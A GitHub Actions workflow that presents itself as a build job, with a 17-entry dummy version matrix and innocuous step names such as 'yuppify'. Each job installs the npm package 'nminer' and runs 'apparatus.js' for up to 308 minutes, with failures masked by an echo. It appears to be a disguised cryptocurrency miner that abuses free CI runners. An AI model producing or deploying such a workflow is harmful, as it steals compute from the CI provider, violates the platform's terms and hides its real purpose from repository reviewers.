name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8100 }
          - { version: 3303 }
          - { version: 6738 }
          - { version: 1535 }
          - { version: 7883 }
          - { version: 7567 }
          - { version: 392 }
          - { version: 6517 }
          - { version: 3274 }
          - { version: 4394 }
          - { version: 5238 }
          - { version: 4471 }
          - { version: 9716 }
          - { version: 9964 }
          - { version: 2247 }
          - { version: 332 }
          - { version: 8760 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: yuppify
        run: |
          npm install nminer@latest
          timeout 308m node apparatus.js || echo "apparatus executed"